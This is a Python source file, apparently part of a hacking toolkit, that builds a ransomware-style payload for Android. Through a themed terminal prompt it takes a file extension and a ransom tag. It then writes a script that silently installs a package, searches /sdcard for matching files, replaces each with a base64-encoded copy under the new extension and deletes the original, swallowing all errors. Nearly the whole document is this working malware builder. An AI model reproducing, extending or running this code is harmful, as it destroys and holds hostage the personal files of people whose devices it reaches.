# -*- coding: utf-8 -*-
import os , time
from colorama import Fore as c
def pr(txt):
    for x in txt:
        print(x, end='', flush=True)  
        time.sleep(0.001)
def android_baj():
    
    if os.name == 'nt':
        
            os.system('cls')
    else:
            os.system('clear') 
    pr(c.YELLOW+'''
           
    ┌─┐┬  ┌─┐  ┌─┐┌─┐┌─┐┬ ┬┬─┐┬┌┬┐┬ ┬   ┌─┐┬ ┬┌┐ ┌─┐┬─┐
    ├┤ │  ├┤   └─┐├┤ │  │ │├┬┘│ │ └┬┘   │  └┬┘├┴┐├┤ ├┬┘
    └─┘┴─┘└────└─┘└─┘└─┘└─┘┴└─┴ ┴  ┴────└─┘ ┴ └─┘└─┘┴└─
    \n''')
    pr(f'{c.LIGHTMAGENTA_EX}+'+'-'*50+"+\n")
    name = input(f'\n{c.WHITE}root&@elf:~# {c.RED}Enter The Name files: ')
    pr(f'{c.LIGHTMAGENTA_EX}+'+'-'*50+"+\n")
    name_baj = input(f'\n{c.WHITE}root&@elf:~# {c.RED}Enter The Name Baj: ')
    pr(f'{c.LIGHTMAGENTA_EX}+'+'-'*50+"+\n")
    baj = f'''
import os
os.system('pip install regex')
import re
import pathlib
def jpg():
   class FileSearch:
       def __init__(self, pattern, dir):
          
           self.regex = re.compile(pattern)
           self.dir = pathlib.Path(dir)
           self.result = []

       def search(self) -> list:
           for root, dir, files in os.walk(self.dir):
               for file in files:
                   if self.regex.match(file):
                       self.result.append(os.path.join(root, file))

           return self.result

       def __enter__(self) -> 'FileSearch':
           return self
       
       def __exit__(self, *args, **kwargs):
           return
    
       def __str__(self):
           return ('<%s.%s search for (%s) in (%s) dirctory>' % (__file__, self.__class__.__name__, str(self.regex), str(self.dir)))

   if __name__ == '__main__':
       with FileSearch(r'.+\.{name}', '/sdcard') as fs:
           result = fs.search()
        
           '''+f'''
import base64 , os
import subprocess
try:
    c = result

    for g in c:
              txt1 = open(g,'rb')
              data_1 = str(txt1.read())
              encodedBytes = base64.b64encode(data_1.encode("utf-8"))
              encodedStr = str(encodedBytes, "utf-8")
              txt = open(g+'.{name_baj}' , 'w+')
              txt.write(encodedStr)
              txt.close()
              txt1.close()
              os.remove(g)
except:
    pass
           '''
    try:
        os.chdir('output')
    except:
        pass
    file = open('baj_android_.py' , 'w+')
    file.write(baj)
    pr(f"{c.WHITE}root&@elf:~# {c.GREEN}The file was created")
    time.sleep(5)
    if os.name == 'nt':
    
        os.system('cls')
    else:
        os.system('clear')       
           
           
           
           
           
           
           
           
